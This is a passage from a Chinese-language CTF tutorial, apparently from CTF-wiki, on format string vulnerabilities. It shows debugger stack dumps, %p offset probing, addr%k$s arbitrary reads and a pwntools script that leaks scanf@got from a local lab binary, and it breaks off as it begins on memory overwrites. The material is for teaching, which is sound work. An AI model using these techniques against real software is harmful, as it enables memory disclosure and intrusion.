printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325 \n(\n%s\n?\n)\n     \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n0xffffcd18\u2502+0x1c: 0x000000e0\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u5728\u6808\u4e0a\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57400xffffcd10\uff0c\u540c\u65f6\u8be5\u5730\u5740\u5b58\u50a8\u7684\u4e5f\u786e\u5b9e\u662f\u662f\"%s\"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002\n\n\n\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u8f93\u51fa\u51fd\u6570\u8c03\u7528\u65f6\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd9\u91cc\u5047\u8bbe\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u4e3a\u7b2ck\u4e2a\u53c2\u6570\u3002\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9\u3002\n\n\naddr%k$s\n\n\n\n\n\n\n\u6ce8\uff1a \u5728\u8fd9\u91cc\uff0c\u5982\u679c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u6808\u4e0a\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e00\u5b9a\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\u6808\u6307\u9488\u81f3\u5c11\u4f4e\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57408\u5b57\u8282\u6216\u800516\u5b57\u8282\u3002\n\n\n\n\n\u4e0b\u9762\u5c31\u662f\u5982\u4f55\u786e\u5b9a\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a\u7b2c\u51e0\u4e2a\u53c2\u6570\u7684\u95ee\u9898\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u786e\u5b9a\n\n\n[tag]%p%p%p%p%p%p...\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u91cd\u590d\u67d0\u4e2a\u5b57\u7b26\u7684\u673a\u5668\u5b57\u957f\u6765\u4f5c\u4e3atag\uff0c\u800c\u540e\u9762\u4f1a\u8ddf\u4e0a\u82e5\u5e72\u4e2a%p\u6765\u8f93\u51fa\u6808\u4e0a\u7684\u5185\u5bb9\uff0c\u5982\u679c\u5185\u5bb9\u4e0e\u6211\u4eec\u524d\u9762\u7684tag\u91cd\u590d\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u5f88\u5927\u628a\u63e1\u8bf4\u660e\u8be5\u5730\u5740\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u4e4b\u6240\u4ee5\u8bf4\u662f\u6709\u5f88\u5927\u628a\u63e1\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e0d\u6392\u9664\u6808\u4e0a\u6709\u4e00\u4e9b\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u8be5\u6570\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6781\u5176\u5c11\u89c1\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66f4\u6362\u5176\u4ed6\u5b57\u7b26\u8fdb\u884c\u5c1d\u8bd5\uff0c\u8fdb\u884c\u518d\u6b21\u786e\u8ba4\u3002\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5b57\u7b26'A'\u4f5c\u4e3a\u7279\u5b9a\u5b57\u7b26\uff0c\u540c\u65f6\u8fd8\u662f\u5229\u7528\u4e4b\u524d\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f\uff0c\u5982\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\nAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n\n00000001\n.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\nAAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7% \n\n\n\n\n\u75310x41414141\u5904\u6240\u5728\u7684\u4f4d\u7f6e\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u6b63\u597d\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c5\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c4\u4e2a\u53c2\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e00\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\n%4\n$s\n\n\n00000001\n.22222222.ffffffff.%4\n$s\n\n\n[\n1\n]\n    \n61439\n segmentation fault \n(\ncore dumped\n)\n  ./leakmemory\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bd5\u56fe\u5c06\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u503c\u4f5c\u4e3a\u5730\u5740\u8fdb\u884c\u89e3\u6790\uff0c\u4f46\u662f\u663e\u7136\u8be5\u503c\u6ca1\u6709\u529e\u6cd5\u4f5c\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u88ab\u89e3\u6790\uff0c\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u5d29\u6e83\u4e86\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8c03\u8bd5\u3002\n\n\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffcd0c\n, \nl8\n]\n\n\n8\n\n0xffffcd0c\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd10\u2502+0x04: 0xffffcd20  \u2192  \n%4\n$s\n\n0xffffcd14\u2502+0x08: 0xffffcd20  \u2192  \n%4\n$s\n\n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd20\u2502+0x14: \n%4\n$s\n     \u2190 \n$eax\n\n0xffffcd24\u2502+0x18: 0xffffce00  \u2192  0x00000000\n0xffffcd28\u2502+0x1c: 0x000000e0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd20 \n%4$s\n)\n\n\n[\n#1] 0x80484ce \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  \nhelp\n x/\nExamine memory: x/FMT ADDRESS.\nADDRESS is an expression \nfor\n the memory address to examine.\nFMT is a repeat count followed by a format letter and a size letter.\nFormat letters are o\n(\noctal\n)\n, x\n(\nhex\n)\n, d\n(\ndecimal\n)\n, u\n(\nunsigned decimal\n)\n,\n  t\n(\nbinary\n)\n, f\n(\nfloat\n)\n, a\n(\naddress\n)\n, i\n(\ninstruction\n)\n, c\n(\nchar\n)\n, s\n(\nstring\n)\n\n  and z\n(\nhex, zero padded on the left\n)\n.\nSize letters are b\n(\nbyte\n)\n, h\n(\nhalfword\n)\n, w\n(\nword\n)\n, g\n(\ngiant, \n8\n bytes\n)\n.\nThe specified number of objects of the specified size are printed\naccording to the format.\n\nDefaults \nfor\n format and size letters are those previously used.\nDefault count is \n1\n.  Default address is following last thing printed\nwith this \ncommand\n or \nprint\n.\ngef\u27a4  x/x 0xffffcd20\n0xffffcd20: 0x73243425\ngef\u27a4  vmmap \nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804b000 0x0806c000 0x00000000 rw- \n[\nheap\n]\n\n0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7fb1000 0x00000000 rw- \n0xf7fd3000 0xf7fd5000 0x00000000 rw- \n0xf7fd5000 0xf7fd7000 0x00000000 r-- \n[\nvvar\n]\n\n0xf7fd7000 0xf7fd9000 0x00000000 r-x \n[\nvdso\n]\n\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rw- \n0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so\n0xffedd000 0xffffe000 0x00000000 rw- \n[\nstack\n]\n\ngef\u27a4  x/x 0x73243425\n0x73243425: Cannot access memory at address 0x73243425\n\n\n\n\n\u663e\u71360xffffcd20\u5904\u6240\u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u53d8\u91cf\u503c0x73243425\u5e76\u4e0d\u80fd\u591f\u88ab\u6539\u7a0b\u5e8f\u8bbf\u95ee\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u81ea\u7136\u5d29\u6e83\u4e86\u3002\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684\u5730\u5740\u5462\uff1f\u6bd4\u5982\u8bf4scanf@got\uff0c\u7ed3\u679c\u4f1a\u600e\u4e48\u6837\u5462\uff1f\u5e94\u8be5\u81ea\u7136\u662f\u8f93\u51fascanf\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u6211\u4eec\u4e0d\u59a8\u6765\u8bd5\u4e00\u4e0b\u3002\n\n\n\u9996\u5148\uff0c\u83b7\u53d6scanf@got\u7684\u5730\u5740\uff0c\u5982\u4e0b\n\n\n\n\n\u8fd9\u91cc\u4e4b\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528printf\u51fd\u6570\uff0c\u662f\u56e0\u4e3ascanf\u51fd\u6570\u4f1a\u5bf90a\uff0c0b\uff0c0c\uff0c00\u7b49\u5b57\u7b26\u6709\u4e00\u4e9b\u5947\u602a\u7684\u5904\u7406\uff0c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u8bfb\u5165\uff0c\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u8bd5\u8bd5\u3002\u3002\u3002\u3002\n\n\n\n\ngef\u27a4  got\n\n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE \n08049ffc R_386_GLOB_DAT    __gmon_start__\n0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0\n0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\n0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u5229\u7528pwntools\u6784\u9020payload\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nsh\n \n=\n \nprocess\n(\n./leakmemory\n)\n\n\nleakmemory\n \n=\n \nELF\n(\n./leakmemory\n)\n\n\n__isoc99_scanf_got\n \n=\n \nleakmemory\n.\ngot\n[\n__isoc99_scanf\n]\n\n\nprint\n \nhex\n(\n__isoc99_scanf_got\n)\n\n\npayload\n \n=\n \np32\n(\n__isoc99_scanf_got\n)\n \n+\n \n%4$s\n\n\nprint\n \npayload\n\n\ngdb\n.\nattach\n(\nsh\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecvuntil\n(\n%4$s\n\\n\n)\n\n\nprint\n \nhex\n(\nu32\n(\nsh\n.\nrecv\n()[\n4\n:\n8\n]))\n \n# remove the first bytes of __isoc99_scanf@got\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5176\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528gdb.attach(sh)\u6765\u8fdb\u884c\u8c03\u8bd5\u3002\u5f53\u6211\u4eec\u8fd0\u884c\u5230\u7b2c\u4e8c\u4e2aprintf\u51fd\u6570\u7684\u65f6\u5019(\u8bb0\u5f97\u4e0b\u65ad\u70b9)\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u7b2c\u56db\u4e2a\u53c2\u6570\u786e\u5b9e\u6307\u5411\u6211\u4eec\u7684scanf\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u8f93\u51fa\n\n\n \n\u2192\n \n0xf7615670\n \nprintf\n+\n0\n       \ncall\n   \n0xf76ebb09\n \n__x86\n.\nget_pc_thunk\n.\nax\n\n   \n\u21b3\n  \n0xf76ebb09\n \n__x86\n.\nget_pc_thunk\n.\nax\n+\n0\n \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\nesp\n]\n\n      \n0xf76ebb0c\n \n__x86\n.\nget_pc_thunk\n.\nax\n+\n3\n \nret\n    \n      \n0xf76ebb0d\n \n__x86\n.\nget_pc_thunk\n.\ndx\n+\n0\n \nmov\n    \nedx\n,\n \nDWORD\n \nPTR\n \n[\nesp\n]\n\n      \n0xf76ebb10\n \n__x86\n.\nget_pc_thunk\n.\ndx\n+\n3\n \nret\n    \n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0xffbbf8dc\n,\n \nl8\n]\n\n\n8\n\n\n0xffbbf8dc\n\u2502\n+\n0x00\n:\n \n0x080484ce\n  \n\u2192\n  \nmain\n+\n99\n \nadd\n \nesp\n,\n \n0x10\n     \n\u2190\n \n$\nesp\n\n\n0xffbbf8e0\n\u2502\n+\n0x04\n:\n \n0xffbbf8f0\n  \n\u2192\n  \n0x0804a014\n  \n\u2192\n  \n0xf76280c0\n  \n\u2192\n  \n__isoc99_scanf\n+\n0\n \npush\n \nebp\n\n\n0xffbbf8e4\n\u2502\n+\n0x08\n:\n \n0xffbbf8f0\n  \n\u2192\n  \n0x0804a014\n  \n\u2192\n  \n0xf76280c0\n  \n\u2192\n  \n__isoc99_scanf\n+\n0\n \npush\n \nebp\n\n\n0xffbbf8e8\n\u2502\n+\n0x0c\n:\n \n0x000000c2\n\n\n0xffbbf8ec\n\u2502\n+\n0x10\n:\n \n0xf765c6bb\n  \n\u2192\n  \nhandle_intel\n+\n107\n \nadd\n \nesp\n,\n \n0x10\n\n\n0xffbbf8f0\n\u2502\n+\n0x14\n:\n \n0x0804a014\n  \n\u2192\n  \n0xf76280c0\n  \n\u2192\n  \n__isoc99_scanf\n+\n0\n \npush\n \nebp\n  \n\u2190\n \n$\neax\n\n\n0xffbbf8f4\n\u2502\n+\n0x18\n:\n \n%4$s\n\n\n0xffbbf8f8\n\u2502\n+\n0x1c\n:\n \n0x00000000\n\n\n\n\n\n\u540c\u65f6\uff0c\u5728\u6211\u4eec\u8fd0\u884c\u7684terminal\u4e0b\n\n\n\u279c\n  \nleakmemory\n \ngit\n:(\nmaster\n)\n \n\u2717\n \npython\n \nexploit\n.\npy\n\n\n[\n+\n]\n \nStarting\n \nlocal\n \nprocess\n \n./leakmemory\n:\n \npid\n \n65363\n\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n\n    \nArch\n:\n     \ni386\n-\n32\n-\nlittle\n\n    \nRELRO\n:\n    \nPartial\n \nRELRO\n\n    \nStack\n:\n    \nNo\n \ncanary\n \nfound\n\n    \nNX\n:\n       \nNX\n \nenabled\n\n    \nPIE\n:\n      \nNo\n \nPIE\n \n(\n0x8048000\n)\n\n\n0x804a014\n\n\\\nx14\n\\\nxa0\n\\\nx0\n%\n4\n$\ns\n\n\n[\n*\n]\n \nrunning\n \nin\n \nnew\n \nterminal\n:\n \n/\nusr\n/\nbin\n/\ngdb\n \n-\nq\n  \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n \n65363\n\n\n[\n+\n]\n \nWaiting\n \nfor\n \ndebugger\n:\n \nDone\n\n\n0xf76280c0\n\n\n[\n*\n]\n \nSwitching\n \nto\n \ninteractive\n \nmode\n\n\n[\n*\n]\n \nProcess\n \n./leakmemory\n \nstopped\n \nwith\n \nexit\n \ncode\n \n0\n \n(\npid\n \n65363\n)\n\n\n[\n*\n]\n \nGot\n \nEOF\n \nwhile\n \nreading\n \nin\n \ninteractiv\n\n\n\n\n\n\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86scanf\u7684\u5730\u5740\u3002\n\n\n\u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u8bf4\u6240\u6709\u7684\u504f\u79fb\u673a\u5668\u5b57\u957f\u7684\u6574\u6570\u500d\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u76f4\u63a5\u76f8\u5e94\u53c2\u6570\u6765\u83b7\u53d6\uff0c\u6709\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145\uff0c\u6765\u4f7f\u5f97\u6211\u4eec\u60f3\u8981\u6253\u5370\u7684\u5730\u5740\u5185\u5bb9\u7684\u5730\u5740\u4f4d\u4e8e\u673a\u5668\u5b57\u957f\u6574\u6570\u500d\u7684\u5730\u5740\u5904\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8fd9\u4e2a\u6837\u5b50\u3002\n\n\n[padding][addr]\n\n\n\n\n\u6ce8\u610f\n\n\n\n\n\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u8f93\u5165\\x0c\\xa0\\x04\\x08%4$s\u8fd9\u662f\u56e0\u4e3a\u867d\u7136\u524d\u9762\u7684\u786e\u5b9e\u662fprintf@got\u7684\u5730\u5740\uff0c\u4f46\u662f\uff0cscanf\u51fd\u6570\u5e76\u4e0d\u4f1a\u5c06\u5176\u8bc6\u522b\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4f1a\u5c06\\,x,0,c\u5206\u522b\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8fdb\u884c\u8bfb\u5165\u3002\u4e0b\u9762\u5c31\u662f\u9519\u8bef\u7684\u4f8b\u5b50\u3002\n\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10   \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  \n\\x0c\\xa0\\x04\\x08%4\n$s\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  \n\\x0c\\xa0\\x04\\x08%4\n$s\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: \n\\x0c\\xa0\\x04\\x08%4\n$s\n   \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: \n\\xa0\\x04\\x08%4\n$s\n\n0xffffcd18\u2502+0x1c: \n\\x04\\x08%4\n$s\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd10 \n\\\\x0c\\\\xa0\\\\x04\\\\x08%4$s\n)\n\n\n[\n#1] 0x80484ce \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  x/x 0xffffcd10\n0xffffcd10:   0x6330785c\n\n\n\n\n\n\n\u8986\u76d6\u5185\u5b58\n\n\n\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u6cc4\u9732\u6808\u5185\u5b58\u4ee5\u53ca\u4efb\u610f\u5730\u5740\u5185\u5b58\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4fee\u6539\u6808\u4e0a\u53d8\u91cf\u7684\u503c\u5462\uff0c\u751a\u81f3\u4fee\u6539\u4efb\u610f\u5730\u5740\u53d8\u91cf\u7684\u5185\u5b58\u5462?\u7b54\u6848\u662f\u53ef\u884c\u7684\uff0c\u53ea\u8981\u53d8\u91cf\u5bf9\u5e94\u7684\u5730\u5740\u53ef\u5199\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u4fee